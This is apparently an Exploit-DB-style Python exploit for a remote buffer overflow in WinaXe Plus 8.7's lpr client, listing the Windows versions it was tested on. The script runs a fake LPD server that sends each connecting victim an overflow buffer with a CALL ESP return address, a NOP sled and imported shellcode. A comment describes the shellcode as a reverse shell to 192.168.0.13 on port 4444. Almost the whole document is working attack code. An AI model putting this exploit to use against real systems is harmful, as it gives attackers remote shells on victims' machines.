# Exploit Title: WinaXe Plus 8.7 - lpr remote buffer overflow
# Date: 2017-01-16
# Exploit Author: Peter Baris
# Exploit link: http://www.saptech-erp.com.au/resources/winaxe_lpr.zip
# Software Link: http://www.labf.com/download/winaxep-ok.html
# Version: 8.7
# Tested on: Windows Server 2008 R2 x64, Windows 7 SP1 x64, Windows 10 Pro x64, Windows Server 2012 R2 x64, Windows Server 2016 x64
#Start the fake LPD daemon -> Add the network printer -> Close

import struct

from payload import buf
import socket
def shell_attack(target_machine, target_port):

# WinAxe Plus 8.7 - lpr remote buffer overflow
# Author: Peter Baris
# Tested on Windows Server 2008 R2 x64, Windows 7 SP1 x64, Windows 10 Pro x64, Windows Server 2012 R2 x64, Windows Server 2016 x64
 
#reverse shell to 192.168.0.13 port 4444, length: 351 bytes, bad characters \x00\x0a\x0d
    

    

    #100299DD - CALL ESP in xwpdllib.dll
    buffer=b"A"*512+b"\xdd\x99\x02\x10"+b"\x90"*32+buf
    port = target_port            
    s = socket.socket()
    ip = target_machine             
    s.bind((ip, port))            
    s.listen(5)                    
    
    
    
    while True:
        conn, addr = s.accept()     
        conn.send(buffer)
        conn.close()


    


    